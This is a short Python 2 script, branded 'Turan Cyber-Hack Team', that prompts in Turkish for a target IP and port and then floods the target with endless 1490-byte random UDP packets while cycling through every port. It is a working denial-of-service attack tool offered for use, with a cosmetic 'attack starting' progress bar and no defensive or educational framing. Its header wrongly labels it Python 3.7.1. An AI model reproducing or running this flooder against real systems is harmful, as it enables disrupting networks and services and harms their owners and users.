#python 3.7.1
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Turan Cyber-Hack Team")
print
print
ip = raw_input("Hedef ip : ")
port = input("Hedef port : ")

os.system("clear")
os.system("figlet Attack Basliyor")
print "[Saldiri Basliyor ] 0% "
time.sleep(1)
print "[Saldiri basliyor] 25%"
time.sleep(2)
print "[Saldiri basliyor ] 50%"
time.sleep(1)
print "[Saldiri Basliyor ] 75%"
time.sleep(2)
print "[Saldiri basladi ] 100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
